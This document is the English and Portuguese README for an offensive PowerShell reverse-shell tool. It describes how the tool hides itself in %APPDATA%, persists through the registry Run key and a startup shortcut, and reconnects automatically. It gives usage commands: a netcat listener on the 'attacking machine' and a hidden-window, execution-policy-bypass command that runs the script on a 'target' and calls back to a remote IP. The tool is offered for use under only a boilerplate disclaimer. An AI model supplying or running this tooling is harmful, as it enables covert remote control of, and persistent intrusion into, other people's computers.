
### 1. `README.md` (English)

```markdown
# PowerShell Persistent Reverse Shell

A cross-platform compatible, stealthy, and feature-rich PowerShell reverse shell script featuring automated disconnect-triggered persistence, robust directory navigation, manual persistence controls, and pre-built operational command helpers.

---

## Features

- **Disconnect-Triggered & Manual Persistence:** Automatically installs persistence vectors when the session terminates or drops, with manual `persist` and `remove_persist` commands available on-the-fly.
- **Multiple Persistence Vectors:**
  - **Windows Registry (`Run` Key):** Adds an entry under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
  - **Startup Folder (`shell:startup`):** Creates an invisible startup shortcut executing the payload hidden.
- **Stealth Execution:** Self-copies to a hidden directory inside `%APPDATA%\Microsoft\Windows` on initial execution to ensure persistence survives even if the original working file is deleted.
- **Advanced Navigation:** Full support for `cd`, absolute/relative paths, and drive switching (e.g., `C:`, `D:`).
- **Custom Built-in Commands:** Includes operational help menus, system info helpers, process listing, network statistics, and clean session exit handling.
- **Automatic Reconnection:** Implements a customizable connection cooldown timer (`RECONNECT_COOLDOWN`) to safely handle dropped connections without flooding or crashing.

---

## Configuration

Edit the configuration variables at the top of the script (`shell.ps1`) before executing:

```powershell
$DEFAULT_IP = "127.0.0.1"       # Listener IP address
$DEFAULT_PORT = 4444            # Listener Port
$RECONNECT_COOLDOWN = 15        # Reconnection retry delay in seconds

```

---

## Usage

### 1. Start your Listener

Set up a listener on your attacking machine using Netcat or Metasploit:

```bash
nc -lvnp 4444

```

### 2. Execute on the Target

Run the script silently in the background using PowerShell with hidden window style:

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File shell.ps1 192.168.1.100:4444

```

---

## Available Commands

Once connected via your listener, you can use the following built-in commands:

| Command | Description |
| --- | --- |
| `help` | Displays the pre-built command help menu. |
| `persist` | Manually triggers and applies all persistence vectors. |
| `remove_persist` | Removes all established persistence hooks and hidden payload files. |
| `sysinfo` | Displays detailed system information. |
| `tasks` | Lists currently running processes. |
| `netstat` | Displays active network connections. |
| `cd <path>` | Changes current working directory or switches drives (e.g., `cd D:`). |
| `exit` | Closes the session gracefully and triggers automatic persistence. |

---

## Disclaimer

> *This software is intended for educational purposes, authorized security testing, and system administration only. The author is not responsible for any misuse or damage caused by this program.*

```

---

### 2. `README.pt-BR.md` (Português)

```markdown
# PowerShell Persistent Reverse Shell

Um script de reverse shell em PowerShell altamente funcional, sigiloso e compatível, apresentando persistência automática acionada por desconexão, navegação robusta de diretórios, controles manuais de persistência e comandos operacionais integrados.

---

## Funcionalidades

- **Persistência Manual e por Queda de Conexão:** Instala vetores de persistência automaticamente quando a sessão é encerrada ou cai, além de permitir comandos manuais como `persist` e `remove_persist` em tempo de execução.
- **Múltiplos Vetores de Persistência:**
  - **Registro do Windows (Chave `Run`):** Adiciona uma entrada em `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
  - **Pasta Startup (`shell:startup`):** Cria um atalho invisível de inicialização executando o payload de forma oculta.
- **Execução Oculta e Autônoma:** Copia-se automaticamente para um diretório seguro dentro de `%APPDATA%\Microsoft\Windows` na primeira execução, garantindo que a persistência continue funcionando mesmo se o arquivo original for excluído.
- **Navegação Avançada:** Suporte completo a `cd`, caminhos absolutos/relativos e troca de partições/drives (ex: `C:`, `D:`).
- **Comandos Internos Personalizados:** Inclui menu de ajuda operacional, listagem de processos, estatísticas de rede e tratamento de encerramento de sessão.
- **Reconexão Automática:** Implementa um temporizador de espera configurável (`RECONNECT_COOLDOWN`) para gerenciar quedas de conexão de forma limpa.

---

## Configuração

Edite as variáveis de configuração no topo do script (`shell.ps1`) antes de executar:

```powershell
$DEFAULT_IP = "127.0.0.1"       # IP do Listener (Atacante)
$DEFAULT_PORT = 4444            # Porta do Listener
$RECONNECT_COOLDOWN = 15        # Tempo de espera em segundos entre tentativas de reconexão

```

---

## Como Usar

### 1. Inicie o seu Listener

Configure um ouvinte na sua máquina utilizando o Netcat ou Metasploit:

```bash
nc -lvnp 4444

```

### 2. Execute no Alvo

Execute o script de forma oculta e sem janelas utilizando o PowerShell:

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File shell.ps1 192.168.1.100:4444

```

---

## Comandos Disponíveis

Uma vez conectado através do seu listener, você pode utilizar os seguintes comandos integrados:

| Comando | Descrição |
| --- | --- |
| `help` | Exibe o menu de ajuda com os comandos pré-prontos. |
| `persist` | Aciona e aplica manualmente todos os vetores de persistência. |
| `remove_persist` | Remove todas as chaves de registro, atalhos de inicialização e arquivos ocultos. |
| `sysinfo` | Exibe informações detalhadas do sistema. |
| `tasks` | Lista os processos em execução no momento. |
| `netstat` | Exibe as conexões de rede ativas. |
| `cd <caminho>` | Altera o diretório de trabalho atual ou troca de drive (ex: `cd D:`). |
| `exit` | Encerra a sessão de forma controlada e dispara a persistência. |

---

## Aviso Legal

> *Este software destina-se exclusivamente a fins educacionais, testes de segurança autorizados e administração de sistemas. O autor não se responsabiliza por qualquer uso indevido ou dano causado por este programa.*

```

```
